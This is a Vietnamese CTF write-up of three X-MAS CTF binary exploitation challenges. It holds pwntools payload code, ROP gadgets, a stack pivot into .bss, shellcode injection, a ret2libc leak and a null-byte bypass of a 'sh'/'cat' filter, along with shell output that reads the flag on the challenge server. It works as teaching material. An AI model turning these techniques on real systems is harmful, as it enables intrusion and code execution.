# Writeup X-MASCTF 
> # Author: Quasar (Team: UIT.ζp33d_0∫_Ψ1m3)
# Challenge Name : ![screenshot](https://github.com/19520611/Writeup/raw/main/xmasCTF/img/doiknowyou1.PNG)
Bài này có điểm số là 45. Đầu tiên mình sẽ đi vào những phân tích cơ bản qua các lệnh file và checksec:
```
higgs@DESKTOP-PMDB9KR:/mnt/c/Users/19520/Music/X-MasCTF/doiknowyou$ file chall
chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e0e53c0345a73991671f9f6548621739ae38efda, stripped
higgs@DESKTOP-PMDB9KR:/mnt/c/Users/19520/Music/X-MasCTF/doiknowyou$ checksec chall
[*] '/mnt/c/Users/19520/Music/X-MasCTF/doiknowyou/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
``` 

Mình sẽ dùng IDA pro để xem mã giả c:
```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char v4; // [rsp+0h] [rbp-30h]
  __int64 v5; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("Hi there. Do I recognize you?");
  gets(&v4, 0LL);
  if ( v5 != 0xDEADBEEFLL )
  {
    puts("Nope.....I have no idea who you are");
    exit(0);
  }
  puts("X-MAS{Fake flag. You'll get the real one from the server }");
  return 0LL;
}
```
Đọc mã giả bạn sẽ thấy rằng chương trình bị lỗi buffer overflow tại hàm gets. Ở bài này bạn chỉ cần đè 4 bytes tại offset $rbp-0x10 bằng 0xdeadbeef (tức là biến v5 như IDA pro hiển thị) thì khi chạy trên server chỗ "puts("X-MAS{" sẽ in ra flag thật cho chúng ta (gợi ý ở hàm puts):
```
higgs@DESKTOP-PMDB9KR:/mnt/c/Users/19520/Music/X-MasCTF/doiknowyou$ python echall.py
[+] Opening connection to challs.xmas.htsp.ro on port 2008: Done
[*] Switching to interactive mode
X-MAS{ah_yes__i_d0_rememb3r_you}
[*] Got EOF while reading in interactive
```
### Ban đầu thì mình nghĩ challenge này khá là bưởi nhưng sau đó mình mới biết challenge này còn liên quan đến 1 challenge khác đó là "Ministerul Mediului" (chall này mình giải chưa ra nên ko viết writeup được :) )  
code khai thác của mình: [echall.py](https://github.com/19520611/Writeup/blob/main/xmasCTF/src/doiknowyou/echall.py)
> flag: X-MAS{ah_yes__i_d0_rememb3r_you}

# Challenge Name: ![screenshot](https://github.com/19520611/Writeup/blob/main/xmasCTF/img/naughty2.PNG)
Ta bắt đầu với các bước phân tích cơ bản cách các lệnh file, checksec, seccomp-tools: 
> checksec: 
``` 
higgs@DESKTOP-PMDB9KR:/mnt/c/Users/19520/Music/X-MasCTF/naughty$ gdb-gef chall
Reading symbols from chall...
(No debugging symbols found in chall)
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded for GDB 10.1 using Python engine 3.9
[*] 3 commands could not be loaded, run `gef missing` to know why.
gef➤  checksec
[+] checksec for '/mnt/c/Users/19520/Music/X-MasCTF/naughty/chall'
Canary                        : ✘
NX                            : ✘
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
gef➤
```
Qua checksec ta thấy được chương trình không bật một trình bảo về nào cả.
> seccomp-tools:
```
higgs@DESKTOP-PMDB9KR:/mnt/c/Users/19520/Music/X-MasCTF/naughty$ seccomp-tools dump  ./chall
Tell Santa what you want for XMAS
```
Phân tích qua seccomp-tools thì chương trình này không ngăn chặn ta gọi 1 systemcall nào.
> file:
```
higgs@DESKTOP-PMDB9KR:/mnt/c/Users/19520/Music/X-MasCTF/naughty$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d9d6dbd83f78de807736b72dcfba4d4be904bd44, stripped
```
### Qua lệnh file cung cấp cho ta thông tin đây là 1 tệp elf 64 bit, nhưng còn 1 điều, bạn hãy chú ý từ cuối cùng ```stripped```. Mình có biết chút ít về stripped, khi 1 chương trình dược biên dịch theo cách thông thường thì gcc sẽ thêm các debugging symbols vào file binary để cho debug đơn giản hơn, nhưng khi biên dịch bằng gcc sử dụng flag ```-s``` (stripped) thì trình biên dịch sẽ gỡ bỏ các debugging symbols làm cho kích cỡ của file sẽ nhỏ hơn và việc debug trở nên khó khăn hơn.

### Muốn biết stripped gây khó khăn cho debug như thế nào các bạn hãy mở ```gdb``` lên và gõ lệnh info function:
```
higgs@DESKTOP-PMDB9KR:/mnt/c/Users/19520/Music/X-MasCTF/naughty$ gdb-pwndbg chall
Reading symbols from chall...
(No debugging symbols found in chall)
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x0000000000400510  puts@plt
0x0000000000400520  fgets@plt
0x0000000000400530  setvbuf@plt
0x0000000000400540  exit@plt
pwndbg>
```
### Các bạn có thể thấy các symbols plt hin thị còn các hàm như main thì lại không hiện ra. Việc này sẽ gây cản trở cho các bạn đặt break point để debug. Sẽ có 1 số cách giúp chúng ta có thể debug được, mình sẽ giới thiệu 1 cách đơn giản (cách này chỉ dùng được khi Pie disable) đó là bạn tìm địa chỉ của hàm main bằng các công cụ như là IDA pro, r2, ... sau đó đặt break point tại địa chỉ đó thì ta có thể debug bình thường: 
> Sử dụng r2 tìm địa chỉ hàm main (bạn nào ko quen dùng tools này thì dùng IDA pro lấy vẫn được nhé):
```
higgs@DESKTOP-PMDB9KR:/mnt/c/Users/19520/Music/X-MasCTF/naughty$ r2 chall
[0x00400550]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400550]> afl
0x00400550    1 42           entry0
0x00400510    1 6            sym.imp.puts
0x00400520    1 6            sym.imp.fgets
0x00400530    1 6            sym.imp.setvbuf
0x00400540    1 6            sym.imp.exit
0x00400630    5 119  -> 62   entry.init0
0x00400600    3 34   -> 29   entry.fini0
0x00400590    4 42   -> 37   fcn.00400590
0x004004e8    3 23           fcn.004004e8
0x00400637    3 159          main
```
Địa chỉ hàm main: 0x00400637. Có được địa chỉ của hàm main rồi thì ta đặc break point rồi debug thôi:
```
higgs@DESKTOP-PMDB9KR:/mnt/c/Users/19520/Music/X-MasCTF/naughty$ gdb-pwndbg chall
Reading symbols from chall...
(No debugging symbols found in chall)
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> b*0x00400637
Breakpoint 1 at 0x400637
pwndbg> r
Starting program: /mnt/c/Users/19520/Music/X-MasCTF/naughty/chall
pwndbg>
Breakpoint 1, 0x0000000000400637 in ?? ()

LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────
*RAX  0x400637 ◂— push   rbp
```
> IDA pro để xem mã giả:
```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char s; // [rsp+0h] [rbp-30h]
  __int16 v5; // [rsp+2Eh] [rbp-2h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  v5 = 0xE4FFu;
  puts("Tell Santa what you want for XMAS");
  fgets(&s, 71, stdin);
  puts("Nice. Hope you haven't been naughty");
  if ( v5 != 0xE4FFu )
  {
    puts("Oh no....no gifts for you this year :((");
    exit(0);
  }
  return 0LL;
}
```
### Mình sẽ mô tả sơ về luồng thực thi chương trình. Chương trình khai báo buffer v6 với offset $rbp-0x30 và v5 với offset là rbp-0x2. Ban đầu chương trình sẽ gán v5 = 0xE4FF sau đó cho cho gọi hàm fgets để nhập vào giá trị cho v5 là 71 bytes. sau đó tiếp tục kiểm tra v5 có bằng 0xE4FF hay không nếu không bằng thực hiện lệnh exit(0). 
### Nhìn qua thì ta có thể dễ dàng thấy lỗi buffer overflow xảy ra ở fgets khi offset của s bằng $rbp - 0x30  còn fgets cho ta nhật vào đến 71 == 0x47 tức là đọc dư 0x47 -0x30 = 0x17 (kết quả này đã tính luôn ghì đè biến v5). Với 0x17 thì ta có thể ghì đè được $rbp và return address và còn dư 7 bytes. 
### Đã xong công đoạn phân tích tiếp theo mình sẽ nêu lên ý tưởng khai thác bài này của mình. Bởi vì các cơ chế bảo về đều disable hết nên mình nghĩ bài này sẽ có nhiều cách khai thác. Vì ở đây NX disable (khi NX enable sẽ ngăn chặn việc thực thi các đoạn shellcode trên 1 số vùng như nhất định vd như stack hay heap) nên mình sẽ chọn cách là chèn shellcode. Vì vậy ta phải xác định  được địa chỉ bắt đầu của shellcode sau đó ta cho return address trỏ vào địa chỉ đó, khi đó shellcode sẽ được thực thi.
### Để giải quyết vấn đề này mình sẽ chọn cách đó là điều khiển $rbp trỏ vào vùng nhớ .bss (vùng nhớ để lưu trữ các biến toàn cục và các biến chưa được khởi tạo dữ liệu vd: int i;). Vì vùng nhớ .bss là vùng nhớ cố định (khi Pie disable) nên ta có thể gán $rbp cho một giá trị địa chỉ do ta chỉ định trên vùng nhơ .bss .  Vậy làm sao để $rbp trỏ vào .bss ? Bạn hãy chú ý đến đoạn cuối của hàm main():
```
│       ┌─< 0x004006b7      7416           je 0x4006cf
│       │   0x004006b9      488d3df80000.  lea rdi, qword str.Oh_no....no_gifts_for_you_this_year_: ; 0x4007b8 ; "Oh no....no gifts for you this year :((" ; const char *s
│       │   0x004006c0      e84bfeffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x004006c5      bf00000000     mov edi, 0                  ; int status
│       │   0x004006ca      e871feffff     call sym.imp.exit           ; void exit(int status)
│       │   ; CODE XREF from main @ 0x4006b7
│       └─> 0x004006cf      b800000000     mov eax, 0
│           0x004006d4      c9             leave
└           0x004006d5      c3             ret
```
Bạn hãy chú ý đến lệnh leave. Lệnh leave tương đương:
```mov rsp, rbp
   pop rbp
```
Điều này có nghĩa khi ta ghè đè giá trị của $rbp trên stack lệnh leave sẽ sẽ lấy giá trị này sẽ lưu vào trong $rbp khi đó ta đã trỏ dc $rbp vào địa chỉ mong muốn. Ta sẽ tìm địa chỉ của phân vùng của .bss bằng lệnh vmmap trên gdb:
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/c/Users/19520/Music/X-MasCTF/naughty/chall
          0x600000           0x601000 r-xp     1000 0      /mnt/c/Users/19520/Music/X-MasCTF/naughty/chall
          0x601000           0x602000 rwxp     1000 1000   /mnt/c/Users/19520/Music/X-MasCTF/naughty/chall
    0x7ffff7dee000     0x7ffff7fa8000 r-xp   1ba000 0      /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7fa8000     0x7ffff7fa9000 ---p     1000 1ba000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7fa9000     0x7ffff7fac000 r-xp     3000 1ba000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7fac000     0x7ffff7faf000 rwxp     3000 1bd000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
    0x7ffff7faf000     0x7ffff7fb5000 rwxp     6000 0
    0x7ffff7fcd000     0x7ffff7fd0000 r--p     3000 0      [vvar]
    0x7ffff7fd0000     0x7ffff7fd2000 r-xp     2000 0      [vdso]
    0x7ffff7fd2000     0x7ffff7ffb000 r-xp    29000 0      /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffc000     0x7ffff7ffd000 r-xp     1000 29000  /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffd000     0x7ffff7ffe000 rwxp     1000 2a000  /usr/lib/x86_64-linux-gnu/ld-2.31.so
    0x7ffff7ffe000     0x7ffff7fff000 rwxp     1000 0
    0x7ffffffde000     0x7ffffffff000 rwxp    21000 0      [stack]
```
Hãy chú ý đến hàng thứ 3 ta thấy được vùng nhớ .bss bắt đầu từ địa chỉ 0x601000 để chọn địa chỉ cho $rbp trỏ tới mình sẽ lấy địa chỉ bắt đầu của .bss 0x601000 + 0x500 = 0x601500
```
    v5 = 0xe4ff000000000000
    main =   0x0040067b #mov word [var_2h], 0xe4ff
    bss_addr = 0x601500 # 0x601000 + 0x500  ==> 0x601000 -> dia chi bat dau cua .bss
    payload = "A"*40
    payload += p64(v5)
    payload += p64(bss_addr)
    payload += p64(main)
```
### Đầu tiên mình sẽ lấy đầy 40 bytes của stack bằng "A" tiếp theo mình phải ghì đè 2 byte từ $rbp -0x2 = 0xe4ff bởi vè nếu có 1 giá trị khác chương trình sẽ gọi hàm exit() và ngay lập tức sẽ ngắt chương trình khi câu lệnh return còn chưa được thực thi. 8 bytes tiếp theo chính là giá trị ghì đè $rbp, 8 bytes tiếp theo là giá trị return address mình sẽ điều hướng nó quay trở lại hàm main 1 lần nữa.
### Có 1 lưu ý khi quay trở lại hàm main:
```
push rbp
mov rbp, rsp
``` 
Đây là 2 câu lệnh luôn phải có khi bắt đầu một hàm , nhưng nếu quay lại từ đây thì giá trị của rbp sẽ bị thay đổi vì vậy ta phải quay  về ở một địa chỉ cao hơn trong main để tránh 2 lệnh này. Mình sẽ cho quay lại tại địa chỉ ``` main =   0x0040067b #mov word [var_2h], 0xe4ff```
```
    bss_addr -= 0x30 # quay lai dinh cua buffer
    payload = shellcode
    payload += 'A'*13
    payload += p64(v5)
    payload += p64(bss_addr+0x30) # ebp  -> 1 gia tri bat ky
    payload += p64(bss_addr) # ret_ addr -> tro ve dinh stack
    p.sendline(payload)
 ```
### Ở payload thứ 2 thì đầu tiên mình sẽ đưa shellcode vào sau đó lấp đầy nhưng bytes kia bằng 1 ký tự bất kỳ sao cho đủ 40 bytes. 8 bytes tiếp theo để ta ghì đè biến v5 tại $rbp-0x2 để chương trình không chạy vào exit. 8 bytes tiếp theo là $rbp lúc này ta có thể nhập tùy ý. 8 bytes tiếp theo là địa chỉ return address ta sẽ ghì đè nó bằng địa chỉ $rbp-0x30 (đầu của buffer)
```
[+] Opening connection to challs.xmas.htsp.ro on port 2000: Done
[*] Switching to interactive mode
Nice. Hope you haven't been naughty
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat /home/ctf/flag.txt
X-MAS{sant4_w1ll_f0rg1ve_y0u_th1s_y3ar}
[*] Got EOF while reading in interactive
$
```
> flag: X-MAS{sant4_w1ll_f0rg1ve_y0u_th1s_y3ar}
Code khai thác: [echall.py](https://github.com/19520611/Writeup/blob/main/xmasCTF/src/naughty/echall.py)
# Challenge Name: ![screenshot](https://github.com/19520611/Writeup/blob/main/xmasCTF/img/ready1.PNG)
### Ta tiếp tục các bước phân tích cơ bản như ở trên, mình sẽ lược bỏ bớt vì nó đã khá dài.
### Đây là 1 file elf 64 bits đã bị stripped nên ta sẽ sử dụng cách ở trên để debug
>checksec:
```
[*] '/mnt/c/Users/19520/Music/X-MasCTF/ready_for_xmas/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
``` 
>Xem mã giả bằng IDA pro:
```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char haystack; // [rsp+0h] [rbp-40h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  if ( byte_601099 )
    exit(0);
  memset(aCatFlag, 0, 9uLL);
  puts("Hi. How are you doing today, good sir? Ready for Christmas?");
  gets(&haystack, 0LL);
  if ( strstr(&haystack, "sh") || strstr(&haystack, "cat") )
    exit(0);
  byte_601099 = 1;
  mprotect(&byte_601099, 1uLL, 1);
  return 0LL;
}
```
### Mình sẽ nói qua luồng thực thi chính của chương trình. Chương trình sẽ cho ta nhập vào từ buffer haystack tại offset $rbp-0x40 với hàm gets -> lỗi buffer overflow. Sau đó kiểm tra chuỗi ta nhập vào có xuất hiện 1 trong 2 ký chuỗi "sh" và "cat" thì chương trình sẽ thực hiện hàm exit(0).
### Ý tưởng khai thác của mình đó là sử dụng kỹ thuật điều khiển $rbp trỏ qua phân vùng .bss như trên bởi vì bạn có thể để ý biến  byte_601099 sẽ được gán bằng 1 ở trên hàm mprotect nếu quay lại thì chương trình sẽ kiểm tra giá trị của nó nếu nó bầng 1 thì sẽ exit ngay. Nếu bạn sử dụng kỹ thuật ret2libc thông thường thì bạn bắt buộc phải quay lại đầu hàm main bởi vì lúc lệnh leave thực thi thì $rbp sẽ mang giá trị 0x4141414141414141 (giá trị rác mà bạn đã đè ở payload đầu tiên) với kỹ thuật này bạn phải quay lại hàm main nơi có 2 lệnh:
```
push rbp
mov rbp, rsp
```
### Nếu ko qua 2 lệnh này thì $rbp sẽ mang giá trị rác và chương trình sẽ bị crash. Nếu quay lại đầu hàm main thì ở ```if(byte_601099)``` chương trình sẽ nhảy vào ```exit(0)``` và kết thúc. Vì vậy ta cần 1 địa chỉ xác định để ghì đè $rbp. Nên mình sẽ sử dụng kỹ thuật cũ như bài trên. Tiếp theo là hàm strstr hàm này sẽ đọc chuỗi nhập vào để so sánh đến khi gặp ký tự NUll vì vậy ta có thể chèn vào '\x00' để hàm này ko tiếp tục kiểm tra để ta có thể chạy dc system("/bin/sh"). 
### Đó là các vấn đề ta phải vượt qua, phần còn lại ta dùng kỹ thuật ret2libc để leak ra địa chỉ của một hàm bất kỳ sau đó trừ cho offset của nó là ra được địa chỉ libc base. Cộng các địa chỉ này vs offset lấy từ libc ta sẽ có được hàm libc tương ứng.
### Mình sẽ nói sơ qua về kỹ thuật ret2libc. Ở payload đầu tiên ta sẽ return address là địa chỉ gadget ```pop rdi ; ret``` ta tìm địa chỉ này bằng cách dùng công cụ ROPgadget:
```
higgs@DESKTOP-PMDB9KR:/mnt/c/Users/19520/Music/X-MasCTF/ready_for_xmas$ ROPgadget --binary chall
Gadgets information
============================================================
0x00000000004006de : adc byte ptr [rax], ah ; jmp rax
.......

0x00000000004008e3 : pop rdi ; ret
0x0000000000400760 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4006f5
0x00000000004005e6 : ret
```
### Ta chỉ quân tâm đến gadget ```pop rdi; ret```  nên những cái còn lại mình sẽ lọc bớt. Vậy khi ghi đè địa chỉ return address bằng gadget này thì nó sẽ làm gì?
```
rbp
return address -> gadget: pop rdi; ret
addr_ 1
addr_2
``` 
### Lệnh pop rdi sẽ lấy addr_1 cho vào thanh ghi rdi; ret sẽ làm ghi rip trỏ vào addr_2
### Vậy để leak được địa chỉ của 1 hàm bất kỳ ta sẽ cho rdi->got@function ; ret-> plt@puts (vì trong chương trình chỉ gọi mỗi hàm puts để in ra output nên chỉ có plt@puts là xuất ra được). got@function ở đây bạn cần thay vào địa chỉ got của 1 hàm bất kỳ nằm trong GOT của chương trình hiện tại .  GOT là viết tắt của ```global offset table``` theo mình hiểu sơ qua đó là khi 1 chương trình gọi 1 hàm trong thư viện thì nó sẽ lưu địa chỉ của hàm đó lại trong GOT để lần sau chương trình có gọi lại hàm đó thì chương trình chỉ cần lấy địa chỉ cùa hàm đó trong GOT để tái sử dụng 
> code leak (mình sẽ tiến hành leak address của puts):
```
 p.recvuntil('Hi. How are you doing today, good sir? Ready for Christmas?\n')
    payload = "A"*0x40
    payload += p64(bss_addr)    #rbp
    payload += p64(pop_rdi)
    payload += p64(elf.symbols['got.puts'])
    payload += p64(elf.symbols['plt.puts'])
    payload += p64(main)
    p.sendline(payload)
```
### Sau đó thì địa chỉ của hàm puts sẽ được in ra lấy địa chỉ này trừ cho offset của nó trên libc (offset là cố định không bao giờ thay đổi với mỗi libc). Ta lấy địa chỉ của hàm puts - offset_puts = base_libc thì ta sẽ ra được địa chỉ cơ sở của libc. lấy địa chỉ này cộng với offset của tương ứng của hàm đó ta sẽ ra địa chỉ của nó trên chương trình đang thực thi:
```
    recieved = p.recvline().strip()
    leak_puts = u64(recieved.ljust(8,b"\x00")) # lay dia chi cua ham puts dc in ra
   
    print "puts: ", hex(leak_puts)
    offset_puts = libc.symbols['puts']
    print "off_puts: ", hex(offset_puts)
    libc_base = leak_puts - offset_puts
```
### Việc còn lại ta chỉ cần thay chỗ rdi thành địa chỉ của "/bin/sh" chỗ ret thì ta cho 1 địa chỉ rác còn kế tiếp là địa chỉ của hàm system:
```
    payload = "A"*0x1f
    payload += "\x00"
    payload += "A"*0x20
    payload +=  p64(bss_addr+0x30)   #rbp 
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(pop_ret)
    payload += p64(system)
    p.sendline(payload)
```
> chạy file exploit:
```
[+] Opening connection to challs.xmas.htsp.ro on port 2001: Done
puts:  0x7f8ba521baa0
off_puts:  0x80aa0
[*] Switching to interactive mode
$ cat /home/ctf/flag.txt
X-MAS{l00ks_lik3_y0u_4re_r3ady}
$
```
flag: X-MAS{l00ks_lik3_y0u_4re_r3ady}
>file exploit: [echall.py](https://github.com/19520611/Writeup/blob/main/xmasCTF/src/ready_for_xmas/echall.py)

## Cảm ơn các bạn đã đọc do kiến thức còn hạn hẹp có gì sai sót mong các bạn góp ý mình sẽ sửa ngay!!!
